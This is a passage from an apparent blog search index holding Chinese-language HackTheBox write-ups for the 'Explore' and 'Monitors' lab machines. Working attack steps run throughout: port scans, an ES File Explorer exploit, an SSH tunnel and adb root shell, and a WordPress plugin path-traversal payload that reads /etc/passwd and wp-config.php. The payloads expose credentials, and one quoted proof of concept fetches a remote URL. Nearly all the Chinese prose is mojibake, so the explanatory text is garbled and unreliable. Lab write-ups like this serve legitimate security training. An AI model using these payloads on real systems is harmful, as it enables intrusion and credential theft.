root.txt\n69f9f1591b2d1701721d539a138c3ce9\n```\næˆåŠŸè·å¾—rootæƒé™çš„flagæ–‡ä»¶\n\næ”¶å·¥ç¡è§‰","tags":["Hackthebox"]},{"title":"Explore - Hackthebox","url":"/2021/07/06/Hackthebox/Easy/Hackthebox-Explore/","content":"\n# Hackthebox - Explore\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Explore/ef2eeeb2-22d0-44ce-8923-e1ba9b893bd4.jpg)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Explore/f5360e65-dcdf-40a4-bf21-e4bb6c44d51a.jpg)\n\n## ä¿¡æ¯æœé›†\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›†\n\nnmap -A -sS -sC -sV -p- 10.10.10.247\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nmap -A -sS -sC -sV -p- 10.10.10.247\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 17:01 CST\nNmap scan report for explore.htb (10.10.10.247)\nHost is up (0.25s latency).\nNot shown: 65530 closed ports\nPORT      STATE    SERVICE VERSION\n2222/tcp  open     ssh     (protocol 2.0)\n| fingerprint-strings:\n|   NULL:\n|_    SSH-2.0-SSH Server - Banana Studio\n| ssh-hostkey:\n|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)\n5555/tcp  filtered freeciv\n38237/tcp open     unknown\n| fingerprint-strings:\n|   GenericLines:\n|     HTTP/1.0 400 Bad Request\n|     Date: Tue, 06 Jul 2021 09:28:06 GMT\n|     Content-Length: 22\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     Invalid request line:\n|   GetRequest:\n|     HTTP/1.1 412 Precondition Failed\n|     Date: Tue, 06 Jul 2021 09:28:06 GMT\n|     Content-Length: 0\n|   HTTPOptions:\n|     HTTP/1.0 501 Not Implemented\n|     Date: Tue, 06 Jul 2021 09:28:11 GMT\n|     Content-Length: 29\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     Method not supported: OPTIONS\n|   Help:\n|     HTTP/1.0 400 Bad Request\n|     Date: Tue, 06 Jul 2021 09:28:28 GMT\n|     Content-Length: 26\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     Invalid request line: HELP\n|   RTSPRequest:\n|     HTTP/1.0 400 Bad Request\n|     Date: Tue, 06 Jul 2021 09:28:11 GMT\n|     Content-Length: 39\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     valid protocol version: RTSP/1.0\n|   SSLSessionReq:\n|     HTTP/1.0 400 Bad Request\n|     Date: Tue, 06 Jul 2021 09:28:28 GMT\n|     Content-Length: 73\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     Invalid request line:\n|     ?G???,???`~?\n|     ??{????w????<=?o?\n|   TLSSessionReq:\n|     HTTP/1.0 400 Bad Request\n|     Date: Tue, 06 Jul 2021 09:28:29 GMT\n|     Content-Length: 71\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     Invalid request line:\n|     ??random1random2random3random4\n|   TerminalServerCookie:\n|     HTTP/1.0 400 Bad Request\n|     Date: Tue, 06 Jul 2021 09:28:29 GMT\n|     Content-Length: 54\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     Invalid request line:\n|_    Cookie: mstshash=nmap\n42135/tcp open     http    ES File Explorer Name Response httpd\n|_http-server-header: ES Name Response Server\n|_http-title: Site doesn't have a title (text/html).\n59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older\n|_http-title: Site doesn't have a title (text/plain).\n2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port2222-TCP:V=7.91%I=7%D=7/6%Time=60E41F41%P=x86_64-pc-linux-gnu%r(NUL\nSF:L,24,\"SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port38237-TCP:V=7.91%I=7%D=7/6%Time=60E41F41%P=x86_64-pc-linux-gnu%r(Ge\nSF:nericLines,AA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x200\nSF:6\\x20Jul\\x202021\\x2009:28:06\\x20GMT\\r\\nContent-Length:\\x2022\\r\\nContent\nSF:-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\nSF:\\nInvalid\\x20request\\x20line:\\x20\")%r(GetRequest,5C,\"HTTP/1\\.1\\x20412\\x\nSF:20Precondition\\x20Failed\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28\nSF::06\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(HTTPOptions,B5,\"HTTP/1\\.\nSF:0\\x20501\\x20Not\\x20Implemented\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2\nSF:009:28:11\\x20GMT\\r\\nContent-Length:\\x2029\\r\\nContent-Type:\\x20text/plai\nSF:n;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nMethod\\x20not\\x20\nSF:supported:\\x20OPTIONS\")%r(RTSPRequest,BB,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Re\nSF:quest\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28:11\\x20GMT\\r\\nConte\nSF:nt-Length:\\x2039\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\\nSF:nConnection:\\x20Close\\r\\n\\r\\nNot\\x20a\\x20valid\\x20protocol\\x20version:\\\nSF:x20\\x20RTSP/1\\.0\")%r(Help,AE,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDat\nSF:e:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28:28\\x20GMT\\r\\nContent-Length:\\x\nSF:2026\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\nSF:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20HELP\")%r(SSLSessionReq,\nSF:DD,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x2\nSF:02021\\x2009:28:28\\x20GMT\\r\\nContent-Length:\\x2073\\r\\nContent-Type:\\x20t\nSF:ext/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid\\x\nSF:20request\\x20line:\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\?\\?\\?,\\?\\?\\?`~\\?\\\nSF:0\\?\\?{\\?\\?\\?\\?w\\?\\?\\?\\?<=\\?o\\?\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0\")%r(TerminalSer\nSF:verCookie,CA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2006\nSF:\\x20Jul\\x202021\\x2009:28:29\\x20GMT\\r\\nContent-Length:\\x2054\\r\\nContent-\nSF:Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\\nSF:nInvalid\\x20request\\x20line:\\x20\\x03\\0\\0\\*%\\?\\0\\0\\0\\0\\0Cookie:\\x20mstsh\nSF:ash=nmap\")%r(TLSSessionReq,DB,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDa\nSF:te:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28:29\\x20GMT\\r\\nContent-Length:\\\nSF:x2071\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection\nSF::\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20\\x16\\x03\\0\\0i\\x01\\0\\0e\nSF:\\x03\\x03U\\x1c\\?\\?random1random2random3random4\\0\\0\\x0c\\0/\\0\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=7/6%OT=2222%CT=1%CU=35534%PV=Y%DS=2%DC=T%G=Y%TM=60E41F\nOS:BE%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SE\nOS:Q(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW6%O2=M54DST11NW6%\nOS:O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST11NW6%O6=M54DST11)WIN(W1=FFFF%W2\nOS:=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M54DNNS\nOS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%\nOS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%\nOS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%\nOS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%\nOS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Device: phone\n\nTRACEROUTE (using port 5900/tcp)\nHOP RTT       ADDRESS\n1   253.69 ms 10.10.14.1\n2   253.76 ms explore.htb (10.10.10.247)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 979.56 seconds\n\n```\nå’±ä»¬å‘ç°ï¼Œåˆ†åˆ«åœ¨`38237`ã€`42135`å’Œ`59777`ä¸Šè¿è¡Œäº†HTTPæœåŠ¡\n\nå’±ä»¬åˆ†åˆ«å»çœ‹çœ‹\n\n![](Hackthebox-Explore/a2e1c391-fb11-40b2-b6d5-c21779dab50c.jpg)\n\nè¿™è¾¹æç¤ºæ˜¯ç©ºå“åº”ï¼Ÿé‚£åšä¸ªfuzzçœ‹çœ‹\n\n```Plain Text\nffuf -u http://10.10.10.247:59777/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 100 -e .php,.html\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€#  ffuf -u http://10.10.10.247:59777/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 100 -e .php,.html\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.247:59777/FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt\n :: Extensions       : .php .html\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 100\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nacct                    [Status: 301, Size: 65, Words: 3, Lines: 1]\nbin                     [Status: 301, Size: 63, Words: 3, Lines: 1]\ncache                   [Status: 301, Size: 67, Words: 3, Lines: 1]\nconfig                  [Status: 301, Size: 69, Words: 3, Lines: 1]\nd                       [Status: 301, Size: 59, Words: 3, Lines: 1]\ndata                    [Status: 301, Size: 65, Words: 3, Lines: 1]\ndev                     [Status: 301, Size: 63, Words: 3, Lines: 1]\netc                     [Status: 301, Size: 63, Words: 3, Lines: 1]\ninit                    [Status: 403, Size: 31, Words: 4, Lines: 1]\nlib                     [Status: 301, Size: 63, Words: 3, Lines: 1]\nmnt                     [Status: 301, Size: 63, Words: 3, Lines: 1]\noem                     [Status: 301, Size: 63, Words: 3, Lines: 1]\nproc                    [Status: 301, Size: 65, Words: 3, Lines: 1]\nproduct                 [Status: 301, Size: 71, Words: 3, Lines: 1]\nsbin                    [Status: 301, Size: 65, Words: 3, Lines: 1]\nstorage                 [Status: 301, Size: 71, Words: 3, Lines: 1]\nsys                     [Status: 301, Size: 63, Words: 3, Lines: 1]\nsystem                  [Status: 301, Size: 69, Words: 3, Lines: 1]\nvendor                  [Status: 301, Size: 69, Words: 3, Lines: 1]\n:: Progress: [61407/61407] :: Job [1/1] :: 199 req/sec :: Duration: [0:05:35] :: Errors: 0 ::\n```\nçœ‹åˆ°è¿™ä¸ªç›®å½•ç»“æ„ï¼Œæˆ‘æ„Ÿè§‰è¿™HTTPæœåŠ¡æ˜¯è¿è¡Œåœ¨æ ¹ç›®å½•ä¸‹çš„\n\nç„¶åæˆ‘åˆå»çœ‹äº†ä¸€ä¸‹è¿™å°é¶æœºçš„ç³»ç»Ÿï¼ŒAndroidç³»ç»Ÿï¼Œå’±ä»¬å»æŸ¥æ‰¾ä¸€ä¸‹Androidçš„æ•æ„Ÿæ–‡ä»¶è¯•è¯•ã€‚\n\n![](Hackthebox-Explore/8d721628-8cd8-4c95-8bdb-4933224713f4.jpg)\n\nç»è¿‡ç¡®è®¤ï¼Œç¡®å®æ˜¯å­˜åœ¨æ–‡ä»¶è¯»å–çš„æ¼æ´ï¼Œä½†æˆ‘ä¸å¤ªäº†è§£Androidï¼Œé‚£åº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿç®€å•ï¼æ‘‡äººå„¿ï¼åœ¨è¯¢é—®ç©Androidçš„æœ‹å‹æ€ä¹ˆæä»¥åï¼Œåˆç»è¿‡å¤§é‡çš„èµ„æ–™æŸ¥æ‰¾ä»¥åŠfuzzä»¥åï¼Œå¾—åˆ°äº†ç­”æ¡ˆ\n\n![](Hackthebox-Explore/b8d2aa7e-6283-4e34-bfa3-7da3c5b0cefe.jpg)\n\n![](Hackthebox-Explore/d2267a43-121d-45cd-91a2-255ec847b09e.jpg)\n\nè¿™é‡Œ/sdcard/æç¤º\n\n```Plain Text\nNo directory listing.\n```\nï¼Œä½†/sdcard1/æç¤º\n\n```Plain Text\n404 file not found.\n```\né‚£ä¹ˆï¼Œè¿™é‡Œå°±å¯ä»¥ç¡®å®šï¼Œ/sdcard/è¿™ä¸ªç›®å½•æ˜¯å­˜åœ¨çš„äº†ï¼Œå’±ä»¬ç»§ç»­å¾€ä¸‹åš\n\n## æ¼æ´åˆ©ç”¨\nåœ¨æˆ‘æ„šè ¢çš„å¯¹`50777`ç«¯å£çš„`Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older`è¿›è¡Œäº†å¤§é‡çš„æœç´¢ä»¥åï¼Œæˆ‘æ‰çœ‹åˆ°ä¸€ä¸ªå…³é”®è¯`Minecraft`ï¼Œæˆ‘ä¸¢ï¼Œè¿™ä¸å°±æ˜¯æˆ‘çš„ä¸–ç•ŒæœåŠ¡å™¨å—ï¼Ÿæ”¾å¼ƒ\n\nç„¶åæŠŠçœ¼å…‰æ”¾åœ¨äº†\n\n```Plain Text\n42134\n```\nç«¯å£ä¸Šçš„\n\n```Plain Text\nES File Explorer Name Response httpd\n```\nä¸Š\n\n![](Hackthebox-Explore/ac92812a-83b5-4d0a-b2eb-83bc613f79c4.jpg)\n\nå¥½å®¶ä¼™ï¼Œè¿™ç›´æ¥å°±æ‰¾åˆ°äº†ä¸€ä¸ªexploit >https://www.exploit-db.com/exploits/50070 è¯¥exploitæä¾›äº†ä¸å°‘å¯æ‰§è¡Œå‘½ä»¤\n\n```Plain Text\ncmds = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','getFile','getDeviceInfo']\n```\nä½¿ç”¨exploitæä¾›listPicsæŒ‡ä»¤è·å–ä¸€äº›å›¾ç‰‡æ–‡ä»¶\n\n```Plain Text\npython3 exploit.py listPics 10.10.10.247\n```\n![](Hackthebox-Explore/73253b24-2da7-4b1e-b4cd-df72a16d342d.jpg)\n\næœ€ç»ˆåœ¨\n\n```Plain Text\nhttp://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg\n```\nä¸‹æ‰¾åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç \n\n![](Hackthebox-Explore/721c9263-8974-4799-a15d-e7db137a0f18.jpg)\n\n```Plain Text\nusername = kristi\npassword = Kr1sT!5h@Rp3xPl0r3!\n```\nå’±ä»¬ä½¿ç”¨sshè¿›è¡Œç™»å½•\n\n```Plain Text\nssh kristi@10.10.10.247 -p 2222\n```\n![](Hackthebox-Explore/3bdc2af2-d557-4578-ab12-2d535df10159.jpg)\n\næˆåŠŸæ‹¿åˆ°shellï¼Œå’±ä»¬æ‰¾æ‰¾çœ‹æ–‡ä»¶\n\n![](Hackthebox-Explore/d6408300-733e-40f7-adf9-aac6dac19e38.jpg)\n\nåœ¨\n\n```Plain Text\n/sdcard/\n```\nç›®å½•ä¸‹æ‰¾åˆ°äº†\n\n```Plain Text\nuser.txt\n```\næ–‡ä»¶ï¼ŒæˆåŠŸæ‹¿åˆ°useræƒé™çš„flagï¼ŒåŒæ—¶æƒ³åˆ°ï¼Œå’±ä»¬æ˜¯å¦å¯ç›´æ¥åˆ©ç”¨\n\n```Plain Text\n59777\n```\nç«¯å£åˆ©ç”¨æ–‡ä»¶è¯»å–ç›´æ¥è¯»å–åˆ°è¯¥flagå‘¢ï¼Ÿ\n\n```Plain Text\nhttp://10.10.10.247:59777/sdcard/user.txt\n```\n![](Hackthebox-Explore/15fd860d-2cf5-4947-9024-f7f8e5c53439.jpg)\n\näº‹å®è¯æ˜ï¼Œæ˜¯å¯ä»¥çš„\n\n## æƒé™æå‡\nå’±ä»¬ç›®å‰æ²¡åˆ©ç”¨è¿‡ä¸”æ— æ³•ç›´æ¥åˆ©ç”¨çš„ç«¯å£åªæœ‰5555ç«¯å£äº†ï¼Œæˆ‘ä¼°è®¡çªç ´å£åœ¨è¿™ä¸Šé¢ï¼Œå’±ä»¬å…ˆä½¿ç”¨sshç»™å®ƒè½¬å‘å‡ºæ¥å§\n\n```Plain Text\nssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222 -N -v -v\n```\nä»£ç†ä¸Šä»¥åï¼Œå’±ä»¬æ¥åˆ†æä¸€ä¸‹å•Šã€‚\n\næ—¢ç„¶è¿™å°Androidè¿æ¥ç€sdå¡ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯å¼€å¯ç€ADBè°ƒè¯•æ¡¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å’±ä»¬æˆ–è®¸å¯ä»¥ç›´æ¥ä½¿ç”¨ADBè¿›è¡Œç ´è§£ã€‚\n\nè¯´æ¥ä¹Ÿå·§ï¼Œè¿™ä¸ªæŠ€å·§è¿˜æ˜¯æˆ‘ä¹‹å‰é—²ç€æ²¡äº‹å„¿ç ”ç©¶ç ´è§£Androidå¯†ç çš„æ—¶å€™æ°å·§çœ‹åˆ°çš„ã€‚\n\n```Plain Text\nadb connect 127.0.0.1:5555\n```\nè¿æ¥æˆåŠŸåï¼Œä½¿ç”¨\n\n```Plain Text\nadb -s 127.0.0.1:5555 shell\n```\nç™»å…¥shell\n\n![](Hackthebox-Explore/39478aaf-9b8f-414a-9f39-ab798ee6f251.jpg)\n\næˆåŠŸè·å¾—rootæƒé™\n\nä½¿ç”¨`find / -name root.txt`æŒ‡ä»¤ï¼ŒæˆåŠŸè·å¾—rootæ–‡ä»¶ä½ç½®`/data/root.txt`\n\n![](Hackthebox-Explore/b061c4b6-f22a-479c-9c56-b7c9c4b3b5a8.jpg)\n\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Monitors - Hackthebox","url":"/2021/06/24/Hackthebox/Hard/Hackthebox-Monitors/","content":"\n# Hackthebox - Monitors\n# **é¶åœºä¿¡æ¯**\n![](Hackthebox-Monitors/448916e6-78fb-4ed3-8caa-f96b8eb52e32.png)\n\n# **é¶åœºç±»å‹**\n![](Hackthebox-Monitors/7d23f011-68e1-48c6-98ea-0700663601ec.png)\n\n# **ä¿¡æ¯æœé›†**\n## Nmap\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›†\n\n```bash\nnmap -A -sS -sC -sV 10.10.10.238\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nmap -A -sS -sC -sV 10.10.10.238\n\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 03:09 CST\nNmap scan report for 10.10.10.238\nHost is up (0.24s latency).\nNot shown: 998 closed ports\nPORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n| 2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)\n| 256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)\n|_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)\n80/tcp open http Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=6/25%OT=22%CT=1%CU=35010%PV=Y%DS=2%DC=T%G=Y%TM=60D4D89\nOS:3%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1\nOS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nTRACEROUTE (using port 1025/tcp)\nHOP RTT ADDRESS\n1 239.07 ms 10.10.14.1\n2 239.14 ms 10.10.10.238\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 32.56 seconds\n```\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¼€å¯äº†22å’Œ80ç«¯å£ï¼Œå’±ä»¬å…ˆå»80ç«¯å£çœ‹çœ‹\n\n## Http\n![](Hackthebox-Monitors/8ffddb27-0550-4446-b71b-af8cddd58352.png)\n\nä¸å…è®¸ä½¿ç”¨IPè¿›è¡Œè®¿é—®ï¼Œé‚£å’±ä»¬å…ˆæ·»åŠ ä¸€ä¸‹hostså§\n\n```bash\necho 10.10.10.238 monitors.htb > /etc/hosts\n```\n![](Hackthebox-Monitors/84ee98fa-49b9-4a8d-87e5-1247f355d849.png)\n\nç„¶åè®¿é—®monitors.htbï¼Œæˆ‘ä»¬æŠŠç›®å…‰æ”¾åœ¨å³ä¸‹è§’Powered by Wordpress\n\nè¿™å¾ˆæ˜æ˜¾çš„æ˜¯wordpresså•Šï¼Œä½¿ç”¨wpscanæ‰«æçœ‹çœ‹\n\n```bash\nwpscan --url http://monitors.htb/ -e p,t,u\n```\n![](Hackthebox-Monitors/e1542669-e868-4c29-8d08-61a8a8372aba.png)\n\nå’±ä»¬æŠŠç›®å…‰æ”¾åœ¨è¿™ä¸€è¡Œwp-with-spritz\n\n![](Hackthebox-Monitors/45b1fc2d-e38b-42db-86f0-1c3badd3ba53.png)\n\næ‰¾åˆ°äº†ä¸€ä¸ªexpï¼Œå’±ä»¬è¿›å»çœ‹çœ‹\n\n> [https://www.exploit-db.com/exploits/44544](https://www.exploit-db.com/exploits/44544)\n\n# **æ¼æ´åˆ©ç”¨**\n```bash\n1. Version Disclosure\n/wp-content/plugins/wp-with-spritz/readme.txt\n\n2. Source Code\nif(isset($_GET['url'])){\n$content=file_get_contents($_GET['url']);\n\n3. Proof of Concept\n/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd\n/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec\n```\næ ¹æ®è¿™ä¸ªexploitç»™å‡ºçš„éªŒè¯ï¼Œå’±ä»¬è¯•è¯•æ˜¯å¦å¯ç”¨\n\n```bash\n[http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd](http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd)\n```\næˆåŠŸè·å–/etc/passwdæ–‡ä»¶\n\n![](Hackthebox-Monitors/9b50b428-4156-45e0-8d3c-c42c0b6a7268.png)\n\nç„¶ååªæ˜¯ä¸€ä¸ªWordpressçš„ç«™ç‚¹ï¼Œå’±ä»¬ç›´æ¥è¯•è¯•æ˜¯å¦å¯ä»¥æŸ¥çœ‹å®ƒçš„é…ç½®æ–‡ä»¶\n\n```bash\nhttp://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/var/www/wordpress/wp-config.php\n```\n![](Hackthebox-Monitors/3b1ec4a0-8f83-4450-ba19-e0bf171ccc18.png)\n\næˆåŠŸè·å¾—æ•°æ®åº“è´¦æˆ·å¯†ç \n\n```bash\nDB_NAME = â€œwordpressâ€\nDB_USER = â€œwpadminâ€\nDB_PASSWORD = â€œBestAdministrator@2020!â€\n```\nè¯¥è´¦æˆ·ä¸å­˜åœ¨äº/etc/passwdå†…ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æ— æ³•ç›´æ¥ä½¿ç”¨sshè¿›è¡Œç™»å½•çš„ï¼Œå’±ä»¬æƒ³æƒ³æœ‰æ²¡æœ‰å…¶ä»–åŠæ³•è¿›è¡Œgetshell\n\n![](Hackthebox-Monitors/3c81bbe9-5d17-41dd-b34b-34ac4215e66e.png)\n\nå°è¯•ä½¿ç”¨è¯¥è´¦æˆ·ç™»å½•åå°ï¼Œä¹Ÿä¸å¯è¡Œï¼Œå¥½å®¶ä¼™è¿™æ˜¯é€¼æˆ‘åŠ¨çœŸæ ¼äº†ï¼Ÿ\n\næˆ‘æ‰¾åˆ°äº†ä¸€ç¯‡LFIè½¬RCEçš„æ–‡ç« \n\n> https://infosecwriteups.com/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899\n\nå’±ä»¬æŠ“ä¸ªåŒ…å§\n\n![](Hackthebox-Monitors/f3580c24-5079-4342-801c-3fe8d476cca0.png)\n\n![](Hackthebox-Monitors/8ee0c557-5794-448e-948c-6d19270d7234.png)\n\næŠ“åŒ…åå°†æˆ‘ä»¬è‡ªå·±è‡ªå®šä¹‰çš„1è®¾ç½®ä¸ºçˆ†ç ´ç‚¹ï¼Œç„¶åé€‰æ‹©Numbersï¼Œè®¾ç½®ä»1åˆ°15\n\næ­£å¸¸æ¥è¯´æ˜¯ä¼šçœ‹åˆ°ä¸€ä¸ªæ¯”è¾ƒå¤§çš„åŒ…çš„ï¼Œä½†æˆ‘è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘é€šè¿‡å…¶ä»–æ–¹å¼(FUZZ)è·‘å‡ºæ¥äº†\n\n```bash\n[http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/000-default.conf](http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/000-default.conf)\n```\n![](Hackthebox-Monitors/18fa0d8a-cabf-4be0-bb67-cf7ca0bf2733.png)\n\nç„¶åå’±ä»¬è·å¾—äº†å¦ä¸€ä¸ªåŸŸå\n\ncacti-admin.monitors.htbï¼Œå’±ä»¬æ·»åŠ è¿›hosts\n\n```bash\necho 10.10.10.238 cacti-admin.monitors.htb >> 